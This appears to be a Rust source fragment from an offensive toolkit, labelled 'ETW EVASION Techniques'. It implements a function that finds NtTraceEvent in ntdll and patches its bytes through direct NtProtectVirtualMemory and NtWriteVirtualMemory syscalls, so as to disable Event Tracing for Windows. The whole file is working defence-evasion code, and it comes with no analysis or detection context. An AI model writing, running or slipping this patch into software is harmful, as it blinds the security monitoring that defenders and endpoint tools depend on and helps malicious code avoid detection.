// =======================================================================================================
// ETW EVASION Techniques
// =======================================================================================================

#[cfg(feature = "EvasionETWSimple")]
use windows_sys::Win32::Foundation::HANDLE;
#[cfg(feature = "EvasionETWSimple")]
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
#[cfg(feature = "EvasionETWSimple")]
use windows_sys::Win32::System::Threading::GetCurrentProcess;
#[cfg(feature = "EvasionETWSimple")]
use std::ffi::c_void;
#[cfg(feature = "EvasionETWSimple")]
use rust_syscalls::syscall;

#[cfg(feature = "EvasionETWSimple")]
pub fn patch_etw() -> bool {
    let patch: [u8; 1] = [0x75];
    
    let ntdll = unsafe { LoadLibraryA(b"ntdll.dll\0".as_ptr()) };
    if ntdll.is_null() {
        return false;
    }

    let mut nt_traceevent = unsafe { GetProcAddress(ntdll, b"NtTraceEvent\0".as_ptr()) };
    if nt_traceevent.is_none() {
        return false;
    }
    
    let mut protectaddress_to_protect: *mut c_void = unsafe {
        std::mem::transmute(nt_traceevent.expect("NtTraceEvent was None"))
    };

    let mut size_to_set = patch.len(); 
    let mut return_value: i32;
    let mut process_handle: HANDLE = unsafe { GetCurrentProcess() };
    let mut protect: u32 = 0x40;
    let mut oldprotect: u32 = 0;
    let mut bytes_written: usize = 0;
    
    unsafe
    {
        return_value = syscall!("NtProtectVirtualMemory", process_handle, &mut protectaddress_to_protect, &mut size_to_set, protect, &mut oldprotect);
    }
    if return_value != 0 {
        return false;
    }

    let patch_ptr = patch.as_ptr() as *const c_void;
    unsafe
    {
        return_value = syscall!("NtWriteVirtualMemory", process_handle, nt_traceevent, patch_ptr, patch.len(), &mut bytes_written);
    }
    if return_value != 0 {
        return false;
    }

    // reprotect page permissions to READ_WRITE
    unsafe
    {
        return_value = syscall!("NtProtectVirtualMemory", process_handle, &mut protectaddress_to_protect, &mut size_to_set, 0x20, &mut oldprotect);
    }
    if return_value != 0 {
        return false;
    }

    return true;
}
